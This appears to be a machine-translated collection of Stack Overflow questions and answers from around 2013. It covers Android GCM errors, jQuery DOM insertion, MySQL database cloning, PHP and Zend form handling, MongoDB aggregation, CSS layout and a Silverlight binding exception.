02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at libcore.net.http.HttpConnection$Address.connect(HttpConnection.java:341)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at libcore.net.http.HttpConnectionPool.get(HttpConnectionPool.java:87)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at libcore.net.http.HttpConnection.connect(HttpConnection.java:128)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at libcore.net.http.HttpEngine.openSocketConnection(HttpEngine.java:315)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at libcore.net.http.HttpEngine.connect(HttpEngine.java:310)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at libcore.net.http.HttpEngine.sendSocketRequest(HttpEngine.java:289)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at libcore.net.http.HttpEngine.sendRequest(HttpEngine.java:239)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at libcore.net.http.HttpURLConnectionImpl.connect(HttpURLConnectionImpl.java:80)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at libcore.net.http.HttpURLConnectionImpl.getOutputStream(HttpURLConnectionImpl.java:188)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:80)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:1009)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:407)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:340)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:458)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at com.p27_2.GCMIntentService.onRegistered(GCMIntentService.java:169)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at com.google.android.gcm.GCMBaseIntentService.handleRegistration(GCMBaseIntentService.java:251)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at com.google.android.gcm.GCMBaseIntentService.onHandleIntent(GCMBaseIntentService.java:153)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at android.app.IntentService$ServiceHandler.handleMessage(IntentService.java:65)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at android.os.Handler.dispatchMessage(Handler.java:99)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at android.os.Looper.loop(Looper.java:137)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at android.os.HandlerThread.run(HandlerThread.java:60)
02-27 11:37:39.523: V/GCMBaseIntentService(1684): Releasing wakelock
02-27 11:37:39.562: D/dalvikvm(1684): GC_CONCURRENT freed 134K, 7% free 8586K/9159K, paused 18ms+7ms, total 70ms 
```

非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-03-13T07:50:34.573

1.  确保在 CloudEndPointUtils 类中将常量 LOCAL_ANDROID_RUN 设置为 false，这意味着我们的服务器未在本地设置。
2.  通过右键单击项目->google->部署到应用引擎，将您的 -AppEngine 项目部署到 google appEngine。
3.  将部署到 CloudEndPints.java 后显示的 url 添加到变量为 LOCAL_APP_ENGINE_SERVER_URL

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T05:27:27.080

您的错误 ,`java.net.BindException: Address already in use`表示本地 AppEngine 实例未正确启动。通常，当我尝试启动本地 GAE 实例时，当另一个 GAE 实例已经将自己绑定到端口（即我启动它两次）时，我会看到此错误，但在这种情况下，您的 Android 应用程序应该与第一个实例通信并且仍然功能。

您的问题有所不同——由于某种原因，您的**初始**GAE 实例无法将自身绑定到端口（我们知道这一点是因为 Android 应用找不到任何本地 GAE 实例）。我会按顺序尝试以下操作，直到它起作用：

1.  确保您的 GAE 运行配置设置为绑定到端口 8888（如果端口设置为 1024 或以下，操作系统可能会拒绝绑定尝试）。
2.  假设您使用 Eclipse，请将您的 GAE 运行配置更改为“自动选择未使用的端口”，然后查看它是否可以正常启动。如果是，则将此端口设置为在您的 GAE 运行配置和 Android 应用程序中使用的端口。如果这解决了它并且您很好奇，您可能想查看已经绑定到端口 8888 的内容。
3.  找到一个绝对没有绑定到任何东西的端口（1024 以上），然后在您的 GAE 运行配置中尝试。
4.  如果你到了这一点，你将无法绑定到任何端口，这很奇怪。如果涉及到这个，请回信=)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-01T06:59:57.103

我遇到了同样的问题：使用 eclipse android 应用引擎连接项目，在具有 localhost 后端的模拟器上注册云端点服务器成功，而在部署了应用引擎后端的设备上运行时失败。在清除设备上的缓存并搜索答案 3 小时后，我做了以下对我有用的操作，现在在设备上成功注册了云端点，我可以将 GCM 发送到我的设备。

1.  右键单击客户端项目> android工具>添加支持库
2.  右键单击服务器端项目 > google > 生成云端点客户端库
3.  delete the app from your phone and clear your phones cache ( for galaxy nexus jelly bean: settings > storage > tap cached data)
4.  make sure the server is not running on your localhost currently
5.  reinstall the app from your computer since you have just updated the support libraries

Hope that helps!!

# javascript - 在具有相同类的 div 之间插入一个元素

> ID：15110765
> 
> 赞同：0
> 
> 时间：2013-02-27T11:18:36.767
> 
> 标签：javascript, jquery, html

我有一个具有这种结构的页面 :: 连续的 div 具有相同的类，但它的每个子 div 都有一个唯一的 id。

```
<div class = 'samediv'>
    <div id = 'onediv'></div>
</div>
<div class = 'samediv'>
    <div id = 'twodiv'></div>
</div>
<div class = 'samediv'>
    <div id = 'thirddiv'></div>
</div> 
```

现在单击唯一的 div，如何在其父级之后插入另一个 div/元素。

例如，在单击**onediv时，我希望在****onediv**的父级和**twodiv**的父级之间有一个 div （例如，**unique**）。

 ****然后结构变为：

```
<div class = 'samediv'>
    <div id = 'onediv'></div>
</div>
<div id = "unique">
</div>
<div class = 'samediv'>
    <div id = 'twodiv'></div>
</div>
<div class = 'samediv'>
    <div id = 'thirddiv'></div>
</div> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T11:20:35.433

```
$(".samediv > div").on("click", function() {
    $("<div />", { id: "unique" }).insertAfter(this.parentNode);
}); 
```

请注意，`"unique"`应该有一些*真正*独特的东西。

**演示：http:** [//jsfiddle.net/4MRwZ/](http://jsfiddle.net/4MRwZ/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:21:09.250

```
$("div.samediv > div").click(function(){
     $(this).parent().after("<div id='unique'></div>");
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:21:21.897

试试这个代码：

```
$('.samediv').click(function(){
   $(this).parent().after('<div id = "unique"> </div>');
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-27T11:23:40.227

试试这个

例子 ：

```
$("#onediv").click(function () {
    $(this).parent().append('<div id = "unique"></div>')
}) 
```

必需的

```
$(".samediv > div").click(function () {
    $(this).parent().append('<div id = "unique"></div>')
}) 
```****

# mysql - 如何使用 SQL 查询克隆具有相同名称和相同表和行/内容的不同名称的 MySQL 数据库

> ID：15110769
> 
> 赞同：7
> 
> 时间：2013-02-27T11:18:53.150
> 
> 标签：mysql, sql

我知道如何克隆表，例如：

```
CREATE TABLE recipes_new LIKE production.recipes; 
INSERT recipes_new 
SELECT * FROM production.recipes; 
```

但我不知道如何克隆例如**database_old**到**database_new**数据库，其中包含 database_old 中的所有表和行。

**因此，只有数据库的名称会改变。其他一切都保持不变。**

现在我通过在 phpmyadmin ad 中导出数据库然后创建一个新数据库并将其导入新数据库来克隆它。

但我想必须有一种更有效的方法来通过 SQL 查询来完成这项任务，比如克隆表。

**重要的！它需要从 phpmyadmin 中的 SQL 查询窗口完成，而不是从 shell 命令行完成。**

提前感谢您建议如何做到这一点。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-02-27T11:23:20.150

你试过使用[MySQL Dump](http://dev.mysql.com/doc/refman/5.1/en/mysqldump.html)吗？

```
$ mysqldump yourFirstDatabase -u user -ppassword > yourDatabase.sql
$ echo "create database yourSecondDatabase" | mysql -u user -ppassword
$ mysql yourSecondDatabase -u user -ppassword < yourDatabase.sql 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-02-27T11:32:04.743

**重要的！它需要从 phpmyadmin 中的 SQL 查询窗口完成，而不是从 shell 命令行完成。**

首先创建一个空白数据库：

```
 CREATE DATABASE `destination` DEFAULT CHARACTER SET 
    latin1 COLLATE latin1_swedish_ci; 
```

然后使用命令show tables；

```
 show source.tables; 
```

然后为每个数据库表（优化创建表和插入行）运行命令：

```
 create table destination.table select * from source.table; 
```

其他方式是使用类似命令：

```
 create table destination.table like source.table 
```

然后插入行；

```
 insert into destination.table select * from source.table 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2018-03-23T12:56:37.157

如果 phpMyAdmin 可用于数据库，您可以按照以下步骤克隆它：

1.  选择所需的数据库
2.  单击操作选项卡
3.  在操作选项卡中，转到*“复制数据库”* -选项并在输入字段中键入所需的克隆数据库名称
4.  选择*“结构和数据”*（取决于您的要求）
5.  *选中“复制前创建数据库”*和*“添加 AUTO_INCREMENT 值”*复选框
**   点击*“开始”**

 *> *用 phpMyAdmin 4.2.13.3 测试*

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2016-10-09T02:05:20.657

1.  使用 phpmyadmin (export.sql) 导出您选择的数据库
2.  使用终端/cmd 导入它： mysql -u username -p databasename < export.sql

然后喝杯咖啡...*

# hadoop - Hadoop 和 Eclipse 入门

> ID：15110772
> 
> 赞同：0
> 
> 时间：2013-02-27T11:18:58.827
> 
> 标签：hadoop

我正在关注一些使用 Eclipse 设置 Hadoop 的教程。

这个来自 Cloudera： http: [//v-lad.org/Tutorials/Hadoop/05%20-%20Setup%20SSHD.html](http://v-lad.org/Tutorials/Hadoop/05%20-%20Setup%20SSHD.html) 但这似乎专注于检查 Hadoop 的最新代码并对其进行调整。虽然这种情况很少见，但通常最新版本的 Hadoop 足以满足大多数用户的需求？

而本教程似乎侧重于设置和运行 hadoop：http: [//v-lad.org/Tutorials/Hadoop/05%20-%20Setup%20SSHD.html](http://v-lad.org/Tutorials/Hadoop/05%20-%20Setup%20SSHD.html)

我只想运行一些基本的 map reduce 作业来开始。我不认为我应该使用来自 Hadoop 的最新代码，因为 cloudera 在上面的第一个链接中指定开始使用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-28T15:24:01.537

这是关于在 Eclipse 中开发/调试应用程序的[博客条目](http://www.thecloudavenue.com/2012/10/debugging-hadoop-mapreduce-program-in.html)和[截屏视频。](http://www.thecloudavenue.com/2014/04/mapreduce-development-eclipse-screencast.html)该过程适用于大多数 Hadoop 版本。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-06-23T08:42:08.060

您可以尝试本教程为 Eclipse 安装 Hadoop 插件：[http ://bigsonata.com/?p=168](http://bigsonata.com/?p=168)

# php - 下拉列表 php

> ID：15110786
> 
> 赞同：0
> 
> 时间：2013-02-27T11:19:41.183
> 
> 标签：php, html-select

我在 php 中有一个个人资料页面，供用户设置他的个人资料。个人资料页面提示用户设置性别。这是代码：

```
<form action='database.php' method=post>
<select name="myvalue">
  <option value=" ">--select--</option>
  <option value="male">male</option>
  <option value="female">female</option>
</select>
<input type=submit>
</form> 
```

用户选择性别后，以下代码获取选择

```
$myvalue=$_POST['myvalue']; 
```

然后通过使用函数将值存储在数据库中。

下次用户访问他的个人资料页面时，我希望下拉列表显示之前选择的值。例如，假设用户第一次创建他的个人资料时选择性别“男性”。如果他再次访问个人资料页面，下拉列表必须自动作为选定值，即值“男性”。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:22:30.197

要将选项字段设置为默认选择，您可以使用`selected`关键字

```
<select name="myvalue">
  <option value=" ">--select--</option>
  <option value="male" selected>male</option>
  <option value="female">female</option>
</select> 
```

如果您使用 xml 文档类型，则必须使用

```
<select name="myvalue">
  <option value=" ">--select--</option>
  <option value="male" selected="selected">male</option>
  <option value="female">female</option>
</select> 
```

您可以为该用户从 cookie 或数据库中加载值，然后执行检查以将“选定”值回显到该选项字段中

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:22:48.400

试试这个 ：

```
<?php 
   $gender = /// fetch value from database
?>
<form action='database.php' method=post>
<select name="myvalue">
  <option value=" ">--select--</option>
  <option value="male" <?php if($gender == "male"){?> selected="selected" <?php }?>>male</option>
  <option value="female" <?php if($gender == "female"){?> selected="selected" <?php }?>>female</option>
</select>
<input type=submit>
</form> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:22:53.163

像这样进行验证。

```
$val = value_from db;
if($val == "male") {
     echo '<option value="male" selected="selected">male</option>';
} elseif($val == "female") {
     echo '<option value="female" selected="selected">female</option>';
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-27T11:23:08.837

只需再次检查值并在 html 中显示 selected="selected"

```
<?php
$value = $_POST['myvalue'];
?>
<form action='database.php' method=post>
<select name="myvalue">
  <option value=" " <?php echo $value==' ' ? 'selected="selected"' : ''; ?> >--select--</option>
  <option value="male" <?php echo $value=='male' ? 'selected="selected"' : ''; ?> >male</option>
  <option value="female" <?php echo $value=='female' ? 'selected="selected"' : ''; ?> >female</option>
</select>
<input type=submit>
</form> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-27T11:23:49.757

像这样的东西：

```
<form action='database.php' method=post>
<select name="myvalue">
  <option value=" ">--select--</option>
  <option value="male" <?php echo $gender=="male"?"selected":""; ?>>male</option>
  <option value="female"  <?php echo $gender=="female"?"selected":""; ?>>female</option>
</select>
<input type=submit>
</form> 
```

但更好的是使用一个像样的模板系统。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-02-27T11:24:13.893

将选定属性添加到选项

```
<select name="myvalue">
<option value=" ">--select--</option>
<?php
$selected = 'selected="selected" ';
foreach(array('male', 'female') as $v){
 echo '<option '.(($v==$dbgender)? $selected : '').'value="'.$v.'">'.$v.'</option>';
}
?>
</select> 
```

**$dbgender 是为该用户存储的值。**

# php - 使用在第一个选择框中选择的值填充第二个选择列表 - Zend Framework 1

> ID：15110794
> 
> 赞同：0
> 
> 时间：2013-02-27T11:20:20.073
> 
> 标签：php, zend-framework, select

我有一个带有 2 个选择框的 ZF 表格。两者都应该从 2 个数据库表中填充。首次呈现表单时，将填充第一个选择框。（所以这已经完成并且工作正常）然后我想通过在用户选择一个值时获取第一个选择框的值来填充第二个选择框并将其传递给选择 SQL 以获取第二组数据。

而且我不希望刷新页面。（所以 ajax/javascript/jquery）

我有以下观点（.phtml）

```
<script type="text/javascript">

$(document).ready(function(){
$('#make').change(function($e){
    $e.preventDefault();
     var href= "index/load";
     var data = 'make_id='+$('#make').val();
     $.ajax({ type: "POST",
           url: href,
          data: data,
          success: function(response){
            location.href = 'index/load';
         }
     });
});
});

</script> 
```

但我无法在我的控制器操作中使用以下方法访问从 ajax 帖子传递的值

```
$this->getRequest()->getParams('make_id'); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:36:06.803

ajax 请求的`data`一部分需要这样的`JSON`对象`{make_id: something}`，因此您必须以这种格式发送参数：

```
$(document).ready(function(){
  $('#make').change(function($e){
  $e.preventDefault();
   var href= "index/load";
   var data = $('#make').val();
   $.ajax({ type: "POST",
     url: href,
     data: {make_id: data},
     success: function(response){
     location.href = 'index/load';
   }
 }); 
```

});

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:50:04.397

好的，找到了一种简单的方法，在我看来 phtml 我有以下内容，

```
 <body>
 <?php
     $this->form->setAction($this->url());
     echo $this->form;

  ?>

   <script type="text/javascript">

   $(document).ready(function(){
       $('#select1').change(function(){
           $('#Myform').submit();
           return false;
       });
   });

   </script>
</body> 
```

在我的控制器动作中，我有

```
public function viewAction()
{

        $form= new Application_Form_Myform();
        $selectbox1 = $form->getElement('select1');
        $selectbox1->setMultiOptions($this->populateselectbox1()); //This function fetch data from the db and make an array
        if ($this->getRequest()->getPost('select1')!=""){
            $selectbox2 = $form->getElement('select2');
            $selected = $this->getRequest()->getPost('select1');
            $select->setMultiOptions($this->populatselectbox2($selected)); //This function fetch data from the db and make an array
            $selectbox1->setValue($selected);
        }
        $this->view->form = $form;
    } 
```

# android - Android“Google Play 音乐”广播意图中的“id”字段对应于什么？

> ID：15110795
> 
> 赞同：1
> 
> 时间：2013-02-27T11:20:25.987
> 
> 标签：android, broadcastreceiver, playback

我有一个收听音乐广播的安卓应用程序。它使用以下 ApplicationManifest.xml (snippet) 接收跟踪更改通知：

```
 <receiver android:name=".music.AndroidMusicBroadcastReceiver">
        <intent-filter>
            <action android:name="com.android.music.metachanged"/>
            <action android:name="com.android.music.playbackcomplete"/>
            <action android:name="com.android.music.playstatechanged"/>
            <action android:name="com.htc.music.metachanged"/>
            <action android:name="com.htc.music.playbackcomplete"/>
            <action android:name="com.htc.music.playstatechanged"/>
        </intent-filter>
    </receiver> 
```

当我从运行默认（内置）**Google Play 音乐**应用程序的 nexus 4 获得此广播意图时，该捆绑包包含有关当前播放曲目的有用信息，包括“艺术家”和“标题”。它*没有*我想要的文件路径。但它确实有一个“id”字段（a `long`），这让我觉得我或许可以使用该 ID 作为键来查找附加信息。但我不知道：这个 ID 是哪个数据库/内容提供商的密钥？

* * *

到目前为止我尝试过的事情：

1）我希望这对应于内容解析器的 _ID 字段之一：

*   MediaStore.Audio.Media.INTERNAL_CONTENT_URI
*   MediaStore.Audio.Media.EXTERNAL_CONTENT_URI

但是我已经尝试查询这两个，并且 ID 不在同一个球场上。我目前的例子是我得到一个“id”（在广播中）`3399`。但是查询 EXTERNAL_CONTENT_URI 中的所有曲目会得到 20865-23051 范围内的 ID，以及几个小的 ID（20 和 24，对应于 google+ 应用程序安装的通知和铃声）。

对于这个来源，当前播放曲目的 ID 将是`21373`（我根据路径查找 ID，我可以通过手动检查找出）。

INTERNAL_CONTENT_URI 只是给了我内置的东西（比如铃声等）——所有的 ID 都小于 100，所以这也没有用。

2）我对*所有*媒体对象做了同样的查询——使用`MediaStore.Files.getContentUri("external")`. 我得到了很多结果，但 ID`3399`是由 newsrob（一个 RSS 阅读器）缓存的随机文件，所以这显然不相关。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:41:32.737

看一下 MediaPlaybackService.java 中的源代码：

```
private void notifyChange(String what) {

    Intent i = new Intent(what);
    i.putExtra("id", Long.valueOf(getAudioId()));
    i.putExtra("artist", getArtistName());
    i.putExtra("album",getAlbumName());
    i.putExtra("track", getTrackName());
    i.putExtra("playing", isPlaying());
    ...
}

/**
 * Returns the rowid of the currently playing file, or -1 if
 * no file is currently playing.
 */
public long getAudioId() {
    synchronized (this) {
        if (mPlayPos >= 0 && mPlayer.isInitialized()) {
            return mPlayList[mPlayPos];
        }
    }
    return -1;
} 
```

关于 ContentProvider 的一些代码：

```
Cursor crsr = MusicUtils.query(this,
                    MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                    new String [] {"_id"}, "_id=" + mPlayList[mPlayPos] , null, null); 
```

我想我不需要说别的了。：） 希望这可以帮到你。

# html - 带有浮动子元素的自动宽度父 div

> ID：15110805
> 
> 赞同：0
> 
> 时间：2013-02-27T11:20:52.920
> 
> 标签：html, css

我试图制作一个过滤器列表，但我发现了一个问题。我有一个 DIV 父母

```
width: auto; 
padding: 8px;
white-space: nowrap; 
```

在里面我得到了 2 input[type="text"]

```
float: left; 
```

现在在 Chrome 上，它们将 1 对齐到另一个附近，但在 IE8 中，第二个输入位于第一个下方。

提前谢谢你，丹尼尔。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:25:59.210

你不需要添加`float:left`

```
.wrap{
    width: auto; 
padding: 8px;
white-space: nowrap;
    background:violet;
    overflow:auto
} 
```

**[演示](http://jsfiddle.net/An4wE/2/)**

# java - 如何在 JSP 中将值从外部页面传递到父页面

> ID：15110815
> 
> 赞同：1
> 
> 时间：2013-02-27T11:21:19.033
> 
> 标签：java, jsp, url

我有一个问题想为我的客户解决。我希望我能解释清楚。假设我有一个 JSP 表单，其中包含一些个人数据字段，并且在同一页面上是弹出按钮，它打开另一个页面，其中包含个人地址字段以添加到父表单页面中。问题是弹出表单来自外部 URL。如何将地址从子页面提交到父页面？

先感谢您。

这是我提到的例子

MyForm - 父表单页面：

```
<html>
    <body>
        <input id="name" value ="John Smith" />

        <input id="billingCity" value=""/>
        ...

    </body>
 </html> 
```

地址验证页面：

```
<html>
    <body>

    <form action ="https://foo.com/HandleAddressValidationResults.jsp">
        <input id="city" value="Oregon" />

        ...
        <input type="submit" value="Accept" />
    </form>
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:55:03.223

这种情况很容易使用 JavaScript 解决。`window.showModalDialog()`方法

如果您单击下面的链接，您将很容易理解。

[使用模态窗口](http://www.codeproject.com/Articles/25388/Accessing-parent-window-from-child-window-or-vice/%22Modal%20Window%22)

例如，

```
function openwindow()
{
    retval=window.showModalDialog("modaltarget.htm")
    document.getElementById('text1').value=retval
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:59:36.163

在您的父页面中，当您调用子弹出页面时，假设父页面是 parent.jsp 并且在弹出窗口中您正在调用父 jsp 中的 child.jsp，当您调用子页面时

```
window.location = ../child.jsp 
```

传递一些参数

```
<script>
var value1 = document.getElementByID('name').innerHTML;
var value2 = document.getElementByID('billingCity').innerHTML;
window.location = "../child.jsp?param1="+value1+"&param2="+value2;
</script> 
```

现在这些参数将在您的 child.jsp 弹出页面中作为请求参数传递，使用 request.getParameter() 获取 param1、param2 ... 的值等等，并在 child.jsp 的输入字段中设置值

# mongodb - MongoDB：使用静态值聚合 $project 添加字段

> ID：15110822
> 
> 赞同：27
> 
> 时间：2013-02-27T11:21:30.103
> 
> 标签：mongodb

我可以以某种方式添加具有静态（未计算）值的自定义字段吗？

我想在发送之前准备对象，我需要删除一些带有内部信息的字段并添加带有一些实体 ID 的字段。

例如，我有这样的对象集合“测试”

```
{_id: ObjectId(...), data: {...}} 
```

我需要将其转换为

```
{data: {...}, entity_id: 54} 
```

那么如何添加 entity_id: 54 而不会在我的代码中循环结果呢？

```
db.test.aggregate({ $project: {_id: 0, data: 1, entity_id: ? } }) 
```

谢谢

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2014-06-03T06:37:41.740

注意 $literal 是在 Mongo 2.6 中实现的。所以现在你可以简单地写：

```
db.test.aggregate(
   {$project: {_id: 0, data: 1, entity_id: {$literal: 54}}}) 
```

请参阅[$literal](http://docs.mongodb.org/manual/reference/operator/aggregation/literal/#exp._S_literal)。

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2013-02-27T12:21:20.787

**从 2.6 开始**编辑**`$literal`表达式存在，因此您现在不必使用解决方法。**

 **原始答案：我知道这听起来可能很愚蠢，但是您可以使用“无操作”表达式来“计算”您需要的内容。

例子：

```
db.test.aggregate( { $project : {_id:0, data:1, entity_id: {$add: [54]} } } ) 
```

有一个`$literal`针对此用例的提议运算符，但尚未实施，您可以[在此处](https://jira.mongodb.org/browse/SERVER-5782)投票。**

# html - 为什么网页会在考虑 css 之前呈现纯 html？

> ID：15110823
> 
> 赞同：1
> 
> 时间：2013-02-27T11:21:32.233
> 
> 标签：html, dom

当我加载我的网页时，我首先在近 1 秒内看到纯 html，然后我看到了带有 css 设计的网页。

为什么页面会首先以纯 html 呈现？我该如何避免呢？

我尝试使用[Google Speedtracer 工具](https://developers.google.com/web-toolkit/speedtracer/get-started#downloading)进行调查，但跟踪显示在 'DOMContentLoaded' DOM 事件之前有很多 'paint' DOM 事件，所以我不确定要查找什么...

如何使用 Speedtracer 工具或任何其他工具查明呈现纯 html 的时刻或事件？

* * *

附加信息：我在 Chrome 和 IE 中都有问题。我还在我的 html 标头中调用 css 文件。所以[这个问题](https://stackoverflow.com/questions/2399716/browser-displays-page-without-styles-for-a-short-moment-visual-glitch)的答案都没有帮助我解决问题。

# silverlight - SilverLight 应用程序 - 在列表框中使用 RadExpander 时出错

> ID：15110829
> 
> 赞同：0
> 
> 时间：2013-02-27T11:21:48.220
> 
> 标签：silverlight, telerik

我需要您的帮助，因为我在 Silverlight 应用程序中收到以下消息：

```
{System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.ArgumentException: Value does not fall within the expected range.
à MS.Internal.XcpImports.CheckHResult(UInt32 hr)
   à MS.Internal.XcpImports.SetValue(IManagedPeerBase obj, DependencyProperty property, DependencyObject doh)
   à MS.Internal.XcpImports.SetValue(IManagedPeerBase doh, DependencyProperty property, Object obj)
   à System.Windows.DependencyObject.SetObjectValueToCore(DependencyProperty dp, Object value)
   à System.Windows.DependencyObject.SetEffectiveValue(DependencyProperty property, EffectiveValueEntry& newEntry, Object newValue)
   à System.Windows.DependencyObject.UpdateEffectiveValue(DependencyProperty property, EffectiveValueEntry oldEntry, EffectiveValueEntry& newEntry, ValueOperation operation)
   à System.Windows.DependencyObject.RefreshExpression(DependencyProperty dp)
   à System.Windows.Data.BindingExpression.SendDataToTarget()
   à System.Windows.Data.BindingExpression.SourceAcquired()
   à System.Windows.Data.Debugging.BindingBreakPoint.<>c__DisplayClass4.<BreakOnSharedType>b__3()
   --- Fin de la trace de la pile d'exception interne ---
   à System.RuntimeMethodHandle.InvokeMethod(Object target, Object[] arguments, Signature sig, Boolean constructor)
   à System.Reflection.RuntimeMethodInfo.Invoke(Object obj, BindingFlags invokeAttr, Binder binder, Object[] parameters, CultureInfo culture, Boolean skipVisibilityChecks)
   à System.Delegate.DynamicInvokeImpl(Object[] args)
   à System.Delegate.DynamicInvoke(Object[] args)
   à StylesBudgetxaml.BindingOperation(Object BindingState, Int32 , Action )} 
```

我正在使用一个列表框，我已将项目更改为 Telerik RadExpanders。

```
<ListBox ItemsSource="{Binding FaqItems, ElementName=Root}" ItemTemplate="{StaticResource FAQListBoxItems}" ItemContainerStyle="{StaticResource FAQListBoxItemStyle}" Width="650" ScrollViewer.HorizontalScrollBarVisibility="Disabled"/>

<ControlTemplate x:Key="ExpanderTemplate" TargetType="telerik:RadExpander">
            <Grid HorizontalAlignment="{TemplateBinding HorizontalAlignment}" VerticalAlignment="{TemplateBinding VerticalAlignment}">

[...]Animation part[...]

<Border BorderBrush="{TemplateBinding BorderBrush}" BorderThickness="{TemplateBinding BorderThickness}" Background="{TemplateBinding Background}" CornerRadius="{StaticResource Expander_BorderRadius}">
                                               <Grid>
                                                               <Grid.ColumnDefinitions>
                                                                              <ColumnDefinition x:Name="col0" Width="Auto"/>
                                                                              <ColumnDefinition x:Name="col1" Width="Auto"/>
                                                               </Grid.ColumnDefinitions>
                                                               <Grid.RowDefinitions>
                                                                              <RowDefinition x:Name="row0" Height="Auto"/>
                                                                              <RowDefinition x:Name="row1" Height="Auto"/>
                                                               </Grid.RowDefinitions>
                                                               <telerik:RadToggleButton x:Name="HeaderButton" Background="Transparent" ClickMode="{TemplateBinding ClickMode}" Foreground="{TemplateBinding Foreground}" FontWeight="{TemplateBinding FontWeight}" FontStyle="{TemplateBinding FontStyle}" FontStretch="{TemplateBinding FontStretch}" FontSize="{TemplateBinding FontSize}" FontFamily="{TemplateBinding FontFamily}" HorizontalAlignment="{TemplateBinding HorizontalHeaderAlignment}" HorizontalContentAlignment="{TemplateBinding HorizontalHeaderAlignment}" IsChecked="{Binding IsExpanded, Mode=TwoWay, RelativeSource={RelativeSource TemplatedParent}}" TabIndex="{TemplateBinding TabIndex}" Template="{StaticResource FAQRadToggleButtonControlTemplate}" VerticalAlignment="{TemplateBinding VerticalHeaderAlignment}" VerticalContentAlignment="{TemplateBinding VerticalHeaderAlignment}">
                                                                              <Grid x:Name="HeaderPanel" Background="Transparent">
                                                                                              <Grid.ColumnDefinitions>
                                                                                                              <ColumnDefinition Width="Auto"/>
                                                                                                              <ColumnDefinition Width="*"/>
                                                                                              </Grid.ColumnDefinitions>
                                                                                              <Grid.RowDefinitions>
                                                                                                              <RowDefinition Height="Auto"/>
                                                                                                              <RowDefinition Height="*"/>
                                                                                              </Grid.RowDefinitions>
                                                                                              <Grid Grid.Column="0" Grid.Row="0">
                                                                                                              <Ellipse x:Name="OuterCircle" Fill="{StaticResource ControlBackground_Normal}" HorizontalAlignment="Center" Height="20" Stroke="{StaticResource ControlOuterBorder_Normal}" VerticalAlignment="Center" Width="20"/>
                                                                                                              <Ellipse x:Name="InnerCircle" HorizontalAlignment="Center" Height="18" Stroke="{StaticResource ControlInnerBorder_Normal}" VerticalAlignment="Center" Width="18"/>
                                                                                                              <Grid x:Name="arrowPanel" RenderTransformOrigin=".5 .5">
                                                                                                                             <Grid.RenderTransform>
                                                                                                                                             <RotateTransform/>
                                                                                                                              </Grid.RenderTransform>
                                                                                                                             <Path x:Name="arrow" Data="M0,0 L0.67,0 4,2.67 7.25,0 8,0 8,0.67 4,4 0,0.75 z" Fill="{StaticResource ControlElement_Normal}" Height="4" RenderTransformOrigin="0.5,0.5" Stretch="None" Width="8">
                                                                                                                                             <Path.RenderTransform>
                                                                                                                                                             <RotateTransform Angle="0"/>
                                                                                                                                             </Path.RenderTransform>
                                                                                                                             </Path>
                                                                                                              </Grid>
                                                                                              </Grid>
